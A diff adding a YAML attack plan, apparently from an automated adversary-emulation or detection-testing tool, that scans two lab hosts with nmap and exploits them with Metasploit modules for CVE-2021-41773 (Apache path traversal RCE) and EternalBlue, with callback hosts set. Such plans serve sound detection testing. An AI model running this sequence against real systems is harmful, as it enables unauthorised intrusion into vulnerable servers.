@@ -1,0 +1,37 @@
+metadata:
+  generated_at: '2026-04-13T13:46:37.232975+00:00'
+  planner: detection
+  total_steps: 4
+steps:
+- name: Reconnaissance on 192.168.56.20
+  type: shell
+  command: nmap -sV -p 80 192.168.56.20
+  delay_before: 2.6
+  delay_after: 1.42
+  log_output: true
+- name: Exploit CVE-2021-41773 on 192.168.56.20
+  type: metasploit
+  module: exploit/multi/http/apache_path_traversal_rce
+  options:
+    RHOSTS: 192.168.56.20
+    LHOST: 192.168.56.10
+  delay_before: 3.94
+  delay_after: 2.21
+  log_output: true
+  on_failure: replan
+- name: Reconnaissance on 192.168.56.30
+  type: shell
+  command: nmap -sV -p 445 192.168.56.30
+  delay_before: 2.09
+  delay_after: 1.72
+  log_output: true
+- name: Exploit CVE-2017-0144 on 192.168.56.30
+  type: metasploit
+  module: exploit/windows/smb/ms17_010_eternalblue
+  options:
+    RHOSTS: 192.168.56.30
+    LHOST: 192.168.56.10
+  delay_before: 5.59
+  delay_after: 1.2
+  log_output: true
+  on_failure: replan
